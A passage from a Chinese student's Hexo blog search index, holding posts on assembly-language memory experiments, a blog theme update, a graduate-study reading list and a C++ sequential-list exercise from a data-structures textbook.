开始的单元中填写数据</strong></p><p>我盲猜，作者想让读者观察到的显示是有的内存地址(ROM)不能写，有的内存地址可以写</p><p>按照书上面写的8086PC机内存地址的空间分配图来说，b8100属于显存地址空间。<br>我输入过程中的感觉很奇怪，这里面的数据会自己变化</p><p>这里按道理来说b810:0000这个存储单元中存放的应该是20H才对，不知道为什么为了30H<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211001103438.png" alt="20211001103438"></p><p>同样都是使用d指令来查询内存中的内容，按道理来说1和2处显示的应该一样才对，3和4就刚好是一样的？？？<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211001103918.png" alt="20211001103918"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新博客主题</title>
      <link href="/2021/09/30/geng-xin-bo-ke-zhu-ti/"/>
      <url>/2021/09/30/geng-xin-bo-ke-zhu-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="更新博客主题"><a href="#更新博客主题" class="headerlink" title="更新博客主题"></a>更新博客主题</h1><p>保研之后，除了规划一下下一步的研究生学习生活，在无意中逛其他大神的博客的时候，无意间发现了这个非常好看的主题。于是就抽空更换了一下，因为之前自己在<code>GitHub page</code>上搭建过一次，这次遇到的困难并不算多。</p><h2 id="遇到的问题以及待办"><a href="#遇到的问题以及待办" class="headerlink" title="遇到的问题以及待办"></a>遇到的问题以及待办</h2><ul><li><p>长时间不写markdown了，以至于很多插件都不太会用了，</p></li><li><p>之前文章中的代码高亮问题，也不知道是因为插件bug的原因，就是代码块好像必须要用小写才行。也懒得改之前的了，<code>后面的文章一定要按照小写的来</code>。</p></li><li><p>之前文章中的目录就不需要了，这个主题有方便的目录</p></li></ul><h3 id="计划继续完善的东西"><a href="#计划继续完善的东西" class="headerlink" title="计划继续完善的东西"></a>计划继续完善的东西</h3><ul><li><input disabled="" type="checkbox"> 在gitee上面搭建一份一样的博客</li><li><input disabled="" type="checkbox"> 还是希望深入接触一下hexo博客，后面还是希望能增添一些属于自己的东西，毕竟是自己的博客嘛</li><li><input disabled="" type="checkbox"> 这段时间反正也是比较闲，就尽量把每天学到的内容总结一下，写上来把，也算是督促自己了</li><li><input disabled="" type="checkbox"> 主页当中的图片大小会影响到下面博客文章的展示排版</li><li><input disabled="" type="checkbox"> 主页轮播图中有的图片不显示，因为他直接把md文章前面写的那些img文件拼接到cdn后面了。后面有机会看着改一下。</li><li><input disabled="" type="checkbox"> 友情链接，那几个图片显示不了，也不知道是不是跨域问题。</li><li><input checked="" disabled="" type="checkbox"> 不知道他这个目录是怎么显示的，有的有，有的没有。搞清楚一下。<strong>文章TOC设置</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 瞎搞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客主题 </tag>
            
            <tag> 待办 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>研究生预备学习</title>
      <link href="/2021/09/30/yan-jiu-sheng-yu-bei-xue-xi-qing-dan/"/>
      <url>/2021/09/30/yan-jiu-sheng-yu-bei-xue-xi-qing-dan/</url>
      
        <content type="html"><![CDATA[<h1 id="研究生预备学习"><a href="#研究生预备学习" class="headerlink" title="研究生预备学习"></a>研究生预备学习</h1><h2 id="情况介绍"><a href="#情况介绍" class="headerlink" title="情况介绍"></a>情况介绍</h2><p>  不管是运气还是个人实力，最终还是被保研到了本校网络空间安全学院继续学习。自己也选择了最开始选择网安专业最希望自己成为的那种人（二进制逆向），也找了学院里面做相关研究的导师。但是自己在本科期间并没有很好的基础。所以决定利用大四的时间，多学习一些基础的知识，以应对繁重科研压力的研究生生活</p><h2 id="主要阅读的书籍清单"><a href="#主要阅读的书籍清单" class="headerlink" title="主要阅读的书籍清单"></a>主要阅读的书籍清单</h2><h3 id="基础书籍"><a href="#基础书籍" class="headerlink" title="基础书籍"></a>基础书籍</h3><ul><li><input checked="" disabled="" type="checkbox"> 汇编语言 王爽</li><li><input disabled="" type="checkbox"> 逆向工程核心原理</li><li><input checked="" disabled="" type="checkbox"> 程序是怎样跑起来的</li></ul><h3 id="进阶书籍"><a href="#进阶书籍" class="headerlink" title="进阶书籍"></a>进阶书籍</h3><p>还在想~~</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习计划 </tag>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构--线性表</title>
      <link href="/2021/07/02/shu-ju-jie-gou-xian-xing-biao-1/"/>
      <url>/2021/07/02/shu-ju-jie-gou-xian-xing-biao-1/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E4%BB%A3%E7%A0%81">代码</a></li></ul><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>直接放代码了，题目就是王道2022线性表那节的题目。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 线性表.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。</span><span class="token comment">//</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token macro-name">LIST_INIT_SIZE</span> <span class="token expression"><span class="token number">100</span> </span><span class="token comment">// 线性表存储空间的初始分配量</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token macro-name">LISTINCREMENT</span> <span class="token expression"><span class="token number">10</span></span><span class="token comment">//线性表存储空间的分配增量</span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token operator">*</span> elem<span class="token punctuation">;</span> <span class="token comment">//存储空间基址</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span><span class="token comment">//当前长度</span>    <span class="token keyword">int</span> listsize<span class="token punctuation">;</span><span class="token comment">//当前分配的存储容量(以sizeof(int)为单位)</span><span class="token punctuation">&#125;</span>SqList<span class="token punctuation">;</span><span class="token comment">/*    初始化创建*/</span>bool <span class="token function">InitList_Sq</span><span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    L<span class="token punctuation">.</span>elem <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>LIST_INIT_SIZE <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> LIST_INIT_SIZE <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>    L<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    L<span class="token punctuation">.</span>listsize <span class="token operator">=</span> LIST_INIT_SIZE<span class="token punctuation">;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">ListPrint_Sq</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf_s</span><span class="token punctuation">(</span><span class="token string">"该顺序表为空"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> L<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf_s</span><span class="token punctuation">(</span><span class="token string">"%d->"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf_s</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*    在固定位置插入元素*/</span>bool <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//在顺序线性表L中第i个位置之前插入新的元素e</span>    <span class="token comment">//i的合法值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">></span> L<span class="token punctuation">.</span>listsize<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//当前存储空间已满，增加分配</span>        <span class="token keyword">int</span><span class="token operator">*</span> newbase <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>listsize <span class="token operator">+</span> LISTINCREMENT<span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>newbase<span class="token punctuation">)</span> <span class="token function">exit</span><span class="token punctuation">(</span>OVERFLOW<span class="token punctuation">)</span><span class="token punctuation">;</span>        L<span class="token punctuation">.</span>elem <span class="token operator">=</span> newbase<span class="token punctuation">;</span><span class="token comment">//新基址</span>        L<span class="token punctuation">.</span>listsize  <span class="token operator">=</span> L<span class="token punctuation">.</span>listsize <span class="token operator">+</span> LISTINCREMENT<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span><span class="token operator">*</span> q <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//q为插入位置</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>L<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> q<span class="token punctuation">;</span> <span class="token operator">--</span>p<span class="token punctuation">)</span>        <span class="token operator">*</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token punctuation">;</span><span class="token comment">//插入位置的元素后移</span>    <span class="token operator">*</span>q <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token operator">++</span>L<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*    删除固定位置的元素*/</span>bool <span class="token function">ListDelete_Sq</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//在顺序线性表L中删除第i个元素，并用e返回值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//被删除元素的位置</span>    e <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token operator">*</span> q <span class="token operator">=</span> L<span class="token punctuation">.</span>elem <span class="token operator">+</span> L<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token operator">++</span>p<span class="token punctuation">;</span> p <span class="token operator">&lt;=</span> q<span class="token punctuation">;</span> <span class="token operator">++</span>p<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token punctuation">;</span><span class="token comment">//被删除元素之后的元素左移</span>    <span class="token operator">--</span>L<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">return</span> false<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*    删除顺序表中最小的元素 √*/</span>bool <span class="token function">ListDeleteMin_Sq</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem<span class="token punctuation">)</span> <span class="token operator">||</span> L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf_s</span><span class="token punctuation">(</span><span class="token string">"长度为零"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span><span class="token operator">*</span> q <span class="token operator">=</span> L<span class="token punctuation">.</span>elem <span class="token operator">+</span> L<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token operator">*</span> tag <span class="token operator">=</span> L<span class="token punctuation">.</span>elem<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> p <span class="token operator">&lt;=</span> q<span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>p <span class="token operator">&lt;</span> <span class="token operator">*</span>tag<span class="token punctuation">)</span> tag <span class="token operator">=</span> p<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    e <span class="token operator">=</span> <span class="token operator">*</span>tag<span class="token punctuation">;</span>    <span class="token operator">*</span>tag <span class="token operator">=</span> <span class="token operator">*</span>q<span class="token punctuation">;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*    顺序表逆置 √*/</span>bool <span class="token function">ListReverse_Sq</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token operator">*</span> temp<span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">,</span><span class="token operator">*</span>q<span class="token punctuation">;</span>    <span class="token comment">// C++不允许空指针，定义只是定义int*,定义了并没有实际的指向。习惯上一定要进行初始指针的初始化操作。</span>    temp <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//也或者在这里直接用int类型的test即可。</span>    <span class="token keyword">int</span> test<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> L<span class="token punctuation">.</span>length<span class="token operator">/</span> <span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        p <span class="token operator">=</span> L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">;</span>        q <span class="token operator">=</span> L<span class="token punctuation">.</span>elem <span class="token operator">+</span> L<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span>        test <span class="token operator">=</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>        <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token operator">*</span>q<span class="token punctuation">;</span>        <span class="token operator">*</span>q <span class="token operator">=</span> test<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*    删除顺序表中所有值为x的元素 √     ----无论是有序表还是无序表用这个都行，有序表可以先找到所有的元素，然后一起移动，但是从时间复杂度上面来讲是一样的    从逻辑上讲，2这个值的确被删除了    但是从存储的结构上讲，2这个值还在存储空间里，只不过在逻辑上，这个位置已经是不合法的了。(改变了顺序表的长度)*/</span>bool <span class="token function">ListDeleValue</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> L<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            k<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    L<span class="token punctuation">.</span>length <span class="token operator">=</span> k<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*    删除值在s和t之间的节点 √    跟上面的方法很像了*/</span>bool <span class="token function">ListDeleValueBetween</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">></span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf_s</span><span class="token punctuation">(</span><span class="token string">"请检查参数设置\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> L<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">&lt;</span>s <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">></span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            k<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    L<span class="token punctuation">.</span>length <span class="token operator">=</span> k<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*    删除有序线性表中所有的重复值*/</span>bool <span class="token function">ListDeleteDuplicateValueInOrder</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> L<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            k<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>L<span class="token punctuation">.</span>elem <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    L<span class="token punctuation">.</span>length <span class="token operator">=</span> k<span class="token punctuation">;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    SqList test<span class="token punctuation">;</span>    <span class="token function">InitList_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListInsert_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//测试删除最小的元素</span>    <span class="token comment">//int tag;</span>    <span class="token comment">//ListDeleteMin_Sq(test, tag);</span>    <span class="token comment">//printf_s("%d", tag);</span>    <span class="token comment">//测试元素逆序</span>    <span class="token comment">//ListReverse_Sq(test);</span>    <span class="token comment">//ListPrint_Sq(test);</span>    <span class="token comment">//测试删除所有值为x的元素</span>    <span class="token comment">//ListDeleValue(test, 2);</span>    <span class="token comment">//ListPrint_Sq(test);</span>    <span class="token comment">//测试删除区间内的值</span>    <span class="token comment">//ListDeleValueBetween(test,2, 5);</span>    <span class="token comment">//ListPrint_Sq(test);</span>    <span class="token comment">//测试删除有序表中的重复值</span>    <span class="token function">ListDeleteDuplicateValueInOrder</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ListPrint_Sq</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单</span><span class="token comment">// 调试程序: F5 或调试 >“开始调试”菜单</span><span class="token comment">// 入门使用技巧: </span><span class="token comment">//   1. 使用解决方案资源管理器窗口添加/管理文件</span><span class="token comment">//   2. 使用团队资源管理器窗口连接到源代码管理</span><span class="token comment">//   3. 使用输出窗口查看生成输出和其他消息</span><span class="token comment">//   4. 使用错误列表窗口查看错误</span><span class="token comment">//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目</span><span class="token comment">//   6. 